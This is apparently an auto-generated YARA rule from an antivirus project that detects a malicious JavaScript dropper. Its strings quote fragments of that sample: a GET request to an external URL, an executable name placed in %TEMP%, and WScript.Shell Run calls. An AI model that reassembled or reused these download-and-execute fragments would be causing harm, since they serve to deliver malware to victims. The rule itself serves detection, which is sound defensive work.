rule sig_20160328_0296122008a5872e813541bc9e1c1370 {
  meta:
    description = "datamaliciousorder - file 20160328_0296122008a5872e813541bc9e1c1370.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0bce28b30cd75670cbdbbac3ef09353e897849248767394f1a837ae4dd9ee826"

  strings:
    $s1  = "function Klcnabzmpu() {return Ftxbgd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QHP7yoJs.exe\";};" fullword ascii
    $s2  = "do {WScript[Wujmccelip](Wwinjrsb() * 11)} while (Yvmoury[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Njufx(Ltwzvxm, Zluaaxtcjr){return Ltwzvxm - Zluaaxtcjr;};" fullword ascii
    $s4  = "Yvmoury[Cipief](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "var Ftxbgd = function Ckjof() {return WScript[Nvjsj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Aeenwwcnl() {return ((Cnxnqykw == true) && (Cnxnqykw == Ymhbln)) ? 1 : Tkmvyp;};" fullword ascii
    $s7  = "function Junxt(Aqyylv){Ftxbgd[\"Run\"](Aqyylv, Tkmvyp, Tkmvyp);};" fullword ascii
    $s8  = "function Cmuudzq()" fullword ascii
    $s9  = "function Wwinjrsb(){return 22;};" fullword ascii
    $s10 = "Cnxnqykw = true; " fullword ascii
    $s11 = "var Cnxnqykw = false;" fullword ascii
    $s12 = "var Gmvehfn = new this[\"Date\"]();" fullword ascii
    $s13 = " while (Vkgavnsfzk){" fullword ascii
    $s14 = "var Tfmvavvdbx = false;" fullword ascii
    $s15 = "return Njufx(Llwfj, Uyovjfp);" fullword ascii
    $s16 = "Ymhbln = true; " fullword ascii
    $s17 = "function Dgeom(Vizvmvskj) {var Llojlr = (1, 2, 3, 4, 5, Vizvmvskj); return Llojlr;};" fullword ascii
    $s18 = "function Tbxfbp(){return Fhpeovxe;};" fullword ascii
    $s19 = "function Zoayr(){return Nvjsj;};" fullword ascii
    $s20 = "var Ymhbln = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}